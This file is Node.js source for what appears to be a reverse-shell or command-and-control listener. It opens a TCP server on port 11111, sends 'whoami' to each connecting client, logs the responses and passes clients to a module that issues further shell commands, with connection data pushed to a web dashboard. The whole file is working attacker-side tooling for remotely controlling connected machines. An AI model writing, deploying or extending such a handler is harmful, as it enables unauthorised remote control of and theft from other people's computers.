"use strict";
const net = require("net");
const dashboard = require("../web_server/ws_server.js");
const manageServer = require("../manage_server.js");
const port = 11111;
const socketClients = require("./clients.js");
const server = net.createServer((client) => {
    client.on("error", (error) => {
        switch (error.code) {
            case "ECONNRESET":
                console.log("\[-] Client disconnected!");
                manageServer.getAndSendNumberOfClients(server);
                break;
            default:
                break;
        }
    });
});

server.listen({
   host : "0.0.0.0",
   port,
},() => {
    console.log(`Socket server listening at ${server.address().address}:${port}`);
    console.log("-------------------------------");
});

server.on("connection", (client) => {
    saveNewClient(client);

    // Response is saved by "data" event since it's the first request.
    client.write("whoami");

    manageServer.getAndSendNumberOfClients(server);
    manageServer.gotoMainMenu();

    client.on("data", async (data) =>  {
        try {
            const clientData = socketClients.get(`${client.remoteAddress}:${client.remotePort}`);
            // Prevent newline being added to shell prompt.
            const clientResponse = data.toString().replace("\n", "");
            clientData.responseHistory.push(clientResponse);
            
            clientData.messageCount++;
            
            if (clientData.messageCount <= 1) {
                setClientName(clientData, clientResponse);
                dashboard.uploadNewConnectionData(clientData);

                return;
            } else {
                console.log(clientResponse);
            }
            manageServer.getAndSendSocketCommand(clientData);
        } catch (err) {
            console.error(`Could not save response from client ${client.remoteAddress}:${client.remotePort}`,err);
        }
    });
});

const saveNewClient = (client) => {
    const fullClientAddress = `${client.remoteAddress}:${client.remotePort}`;
    console.log(`[+] Connection receieved: ${fullClientAddress}`);
    socketClients.set(fullClientAddress, { address: fullClientAddress, messageCount : 0, name: "", responseHistory : [], connectionStarted: Date.now(), client });    
}

const setClientName = (client, name) => {
    client.name = name;
}

module.exports = server;